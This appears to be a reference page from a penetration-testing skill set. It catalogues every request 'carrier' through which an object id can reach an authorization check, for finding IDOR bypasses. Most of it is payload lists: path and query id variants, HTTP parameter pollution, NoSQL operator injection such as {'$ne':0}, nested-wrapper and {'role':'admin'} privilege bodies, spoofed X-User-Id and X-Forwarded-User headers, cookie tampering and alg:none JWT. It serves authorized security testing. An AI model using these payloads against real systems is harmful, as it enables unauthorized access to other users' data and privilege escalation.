# Carriers — every place the id can appear

The object id reaches the authorization check through exactly one
carrier at a time. Each carrier has its own parser, its own coercion
rules, and its own bypass shapes. Enumerate the carrier BEFORE picking
payloads — a `id=42` in the query string and a `{"id":42}` in JSON go
through different code paths and fail for different reasons.

---

## 1. Path segment

The commonest carrier. The router binds a path template to a handler:

```
GET /users/42
GET /api/v1/users/42
GET /notes/1001
GET /orders/0042          # zero-padded — the router may parse as int
GET /files/report_42.pdf  # the id is inside a filename
GET /users/42/orders/1001 # nested — TWO ids, each checked separately
GET /tenants/7/users/42   # composite — the tenant check may be missing
GET /u/42 /me /self /current /mine /own   # alias ids
GET /admin /root          # role-name-as-id
```

Probe shapes per segment:

```
42 → 1 → 0 → -1 → 0001 → 1.0 → 1e0 → 0x1 → +1 → '1' → "1"
→ [1] → {"id":1} → id=1 → ?id=1 → ;id=1 → #frag
→ VXNlcjo0Mg==            # b64(Type:id) — Relay/GraphQL global ids
→ 550e8400-...            # uuid v1..v8 — try every version digit
→ 507f1f77bcf86cd799439011  # 24-hex ObjectId
→ 01HXXX...               # ULID (Crockford b32, timestamp-prefixed)
→ 0ujtsYcgvSTl8PAi        # nanoid
→ 15BQ0TNJN6TDAV40JWS2Y5G4J # snowflake
```

Path-segment rules that matter:

- **Trailing-slash and dot suffix**: `/users/42.json`,
  `/users/42.xml`, `/users/42/` — a different route may run with the
  same id but a different (missing) check.
- **Path parameter with regex constraint**: `/users/{id:\d+}` — the
  non-numeric probe never reaches the handler, so a 404 means "router
  rejected", not "denied". A 404 is not a falsifier.
- **Prefix mismatch**: `/api/v1/users/42` denies but
  `/api/v2/users/42`, `/users/42`, `/internal/users/42` do not —
  versioned routes carry separate middleware stacks.

## 2. Query parameter

```
?id=42  ?id=1,2,3  ?id[]=1  ?id[0]=1  ?id=1&id=2   (last/first wins)
?user_id=1  ?userId=1  ?uid=1  ?u=1  ?user=1  ?user-id=1  ?user.id=1
?user[id]=1  ?owner=1  ?owner_id=1  ?author_id=1  ?account_id=1
?tenant_id=1  ?org_id=1  ?team_id=1  ?for=1  ?for_user=1  ?of=1  ?by=1
?assigned_to=1  ?subject=1  ?target=1  ?created_by=1  ?parent_id=1
?doc=42  ?file=42  ?path=42  ?item=42  ?object=42  ?resource=42
?record=42  ?entry=42  ?node=42  ?entity=42  ?ref=42  ?ref_id=42
?pk=42  ?guid=42  ?uuid=42  ?sid=42  ?slug=admin  ?name=admin
?username=admin  ?email=a@t.tld  ?handle=admin
```

Query rules:

- **Duplicate params**: `?id=1&id=42` — the framework may take first
  (PHP default), last (Flask default), or make a list. The check may
  read one and the lookup another — the classic HPP IDOR bypass.
- **Array syntax**: `?id[]=42` vs `?id=42` — if the check runs on a
  scalar but the query builder accepts a list, the check may pass while
  the fetch returns other people's rows.
- **Nested syntax**: `?user[id]=42` — qs-style parsing creates
  `{"user":{"id":42}}`, which can bypass a flat `req.query.id` check.

## 3. Body JSON — the flat field

```json
{"id":42}               {"id":"42"}              {"id":[42]}
{"id":[1,2,3]}          {"user_id":1}            {"userId":1}
{"uid":1}               {"u":1}                  {"user":1}
{"owner":1}             {"owner_id":1}           {"author_id":1}
{"account":1}           {"account_id":1}         {"tenant_id":1}
{"org_id":1}            {"team_id":1}            {"for":1}
{"of":1}                {"by":1}                 {"assigned_to":1}
{"subject":1}           {"target":1}             {"created_by":1}
{"parent_id":1}         {"doc":42}               {"file":42}
{"object":42}           {"resource":42}          {"record":42}
{"entry":42}            {"node":42}              {"entity":42}
{"ref":42}              {"pk":42}                {"guid":"..."}
{"uuid":"..."}          {"slug":"admin"}         {"name":"admin"}
{"username":"admin"}    {"email":"a@t.tld"}
```

JSON coercion shapes that matter:

- **`{"id":{"$gt":0}}`** — if the body is passed to a NoSQL query the
  operator object escapes the equality check entirely (cross-class:
  see `skills/web-nosqli/references/`).
- **`{"id":{"$ne":0}}`, `{"id":{"$in":[1,2,3]}}`,
  `{"id":{"$exists":true}}`, `{"id":{"$regex":".*"}}`** — same family.
- **Type confusion**: `"42"` vs `42` vs `[42]` vs `{"id":42}` — the
  check may compare `===` while the lookup uses `==`, or vice versa.

## 4. Body JSON — nested wrappers

The flat-field check reads `body.id`; the binder maps
`body.user.id`. The wrapper names that reach real binders:

```json
{"user":{"id":42}}        {"author":{"id":1}}       {"owner":{"id":1}}
{"account":{"id":1}}      {"tenant":{"id":1}}       {"org":{"id":1}}
{"team":{"id":1}}         {"doc":{"id":42}}         {"object":{"id":42}}
{"resource":{"id":42}}    {"record":{"id":42}}      {"entity":{"id":42}}
{"item":{"id":42}}        {"node":{"id":42}}        {"edge":{"id":42}}
{"data":{"id":42}}        {"data":{"user":{"id":42}}}
{"attributes":{"id":42}}  {"input":{"id":42}}       {"params":{"id":42}}
{"args":{"id":42}}        {"query":{"id":42}}       {"filter":{"id":42}}
{"where":{"id":42}}       {"update":{"id":42}}      {"fields":{"id":42}}
{"model":{"id":42}}       {"payload":{"id":42}}     {"body":{"id":42}}
{"request":{"id":42}}     {"form":{"id":42}}        {"post":{"id":42}}
{"message":{"id":42}}     {"event":{"id":42}}       {"command":{"id":42}}
{"action":{"id":42}}      {"operation":{"id":42}}   {"mutation":{"id":42}}
{"input":{"user":{"id":42}}}   {"variables":{"user":{"id":42}}}
```

The privilege-shape variant — same wrappers, ownership fields:

```json
{"user":{"role":"admin"}}        {"user":{"is_admin":true}}
{"data":{"role":"admin"}}        {"params":{"role":"admin"}}
{"input":{"role":"admin"}}       {"update":{"role":"admin"}}
{"user":{"tenant_id":1}}         {"user":{"org_id":1}}
{"author":{"id":1}}              {"owner":{"id":1}}
```

Probe order: flat → `user` → `data` → `input`/`params`/`args` (the
three binder conventions) → `update`/`doc`/`model` (the ORM
conventions). Stop at the first shape whose response differs from the
flat-field baseline — that difference is the signal the wrapper
reached a field the check missed.

## 5. Form body

```
id=42                       # urlencoded
user_id=42  user[id]=42  user.id=42
id=42&id=43                 # duplicate — same HPP story as query
data[id]=42  data[user][id]=42    # Rails/PHP nested form syntax
```

Multipart: the id arrives as a part named `id`, `user_id`,
`metadata`, or inside a JSON part (`Content-Disposition:
form-data; name="meta"` containing `{"id":42}`). A filter that scans
only `name=id` misses the JSON part.

## 6. Headers and cookies

```
X-User-Id: 42        X-Uid: 42        X-Account-Id: 42
X-Tenant-Id: 42      X-Org-Id: 42     X-Team-Id: 42
X-Forwarded-User: admin    X-Original-User: admin
Cookie: user_id=42; role=admin; tenant=1
Cookie: session=<b64({"user":{"id":42}})>
```

Header carriers matter when a trusted proxy injects them — the app
believes `X-User-Id` only because the edge was supposed to strip and
re-add it. If the edge does not, the client sets it directly. See
`skills/web-request-smuggling/` and `skills/web-idor/references/
the-boundary.md` for the proxy-trust pattern.

## 7. GraphQL variables

```json
{"query":"{user(id:42){email}}"}
{"query":"query($id:ID!){user(id:$id){email}}","variables":{"id":"42"}}
{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email}}}"}
```

Three carriers inside one request: the literal in the query string,
the `variables` object, and the Relay `node(id:)` global id. A check
on the literal does not fire on the variable and vice versa.

## 8. WebSocket / SSE / RPC

```json
{"type":"get","id":42}
{"action":"fetch","user_id":42}
{"method":"getUser","params":{"id":42}}          # JSON-RPC
{"jsonrpc":"2.0","method":"getUser","params":[42],"id":1}
```

WebSocket messages bypass HTTP middleware stacks entirely in many
frameworks — the auth decorator wraps the upgrade, not each message.

## 9. Signed and encrypted carriers

The id can live inside a JWT claim, a signed cookie, an encrypted
token, or a signed URL. Tampering requires breaking the signature
first — cross-class into `skills/web-auth-session/` before treating
the carrier as forgeable. An unsigned `alg:none` JWT or a
`sub`/`user_id` claim the app trusts blindly is IDOR-by-session.

## 10. Carrier matrix → falsifier

| Carrier | If the response is... | The check is... |
|---|---|---|
| path `/users/N` | 404 for every N ≠ mine | probably enforced — move carrier |
| query `?id=` | same as path result | shared check — real denial |
| JSON flat | same as path | enforced at model layer — strong |
| JSON nested `user.id` | differs from flat | the bypass — record the diff |
| header `X-User-Id` | 200 with foreign data | proxy-trust IDOR |
| GraphQL var | differs from literal | resolver-side check missing |

Record per carrier: request, response excerpt, expected signal,
observed result. A "same response as flat" across all carriers is a
real negative — the check sits below the transport layer and no
carrier trick will bypass it; switch to ownership-model attacks
(mass-assignment, second-order) instead.
